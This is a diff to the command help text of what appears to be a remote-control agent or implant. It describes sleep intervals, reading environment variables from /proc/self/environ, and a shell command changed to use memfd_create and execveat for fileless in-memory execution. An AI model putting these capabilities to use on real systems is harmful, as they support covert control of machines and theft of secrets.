@@ -8,10 +8,10 @@ commands:
     - cd
 
 help:
-    ls: "List current directory Relative path works too except for '~'. Usage: ls </path/to/directory>"
+    ls: "List current directory Relative path works too EXCEPT for '~'. Usage: ls </path/to/directory>"
     exit: "Kill the agent process (won't delete the file)"
     sleep: "Set the sleep interval for the agent. Usage: sleep <seconds>"
-    cat: "Read the contents of the file. Relative path works too except for '~'. Usage: cat </path/to/file>"
-    env: "Read environmental variables at /proc/self/environ"
-    shell: "Checks current directory first then parses and executes commands through the PATH variable until found. (Does not support all command) Usage example: shell bash script.sh"
-    cd: "Change directories. Absolut and relative paths work except for '~' shorthand. Usage: cd /tmp"
+    cat: "Reads the contents of the file. Relative path works too EXCEPT for '~'. Usage: cat </path/to/file>"
+    env: "Reads environmental variables at /proc/self/environ"
+    shell: "Uses memfd_create and execveat to load and execute local binaries. (Does not support interactive commands like 'cd') Usage example: shell bash script.sh"
+    cd: "Change directories. Absolut and relative paths work EXCEPT for '~' shorthand. Usage: cd /tmp"
